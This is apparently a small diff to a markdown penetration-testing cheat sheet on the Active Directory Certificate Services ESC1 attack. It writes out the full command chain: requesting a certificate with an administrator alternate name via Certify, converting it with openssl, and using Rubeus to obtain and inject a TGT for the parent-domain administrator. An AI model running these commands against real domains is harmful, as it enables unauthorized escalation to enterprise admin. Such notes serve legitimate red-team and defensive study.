@@ -26,4 +26,5 @@ Enrolee can request cert for ANY user
 *  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
 * **Convert from cert.pem to pfx and use it to request a TGT for EA.**
   * `openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
-* `Rubeus.exe asktgt /user:<Parent-Domain-FQDN>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional` &#x20;
+* `Rubeus.exe asktgt /user:<Parent-Domain-FQDN>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /ptt`   <sup><sub>/password:SecretPass@123 - optional<sub></sup> &#x20;
+
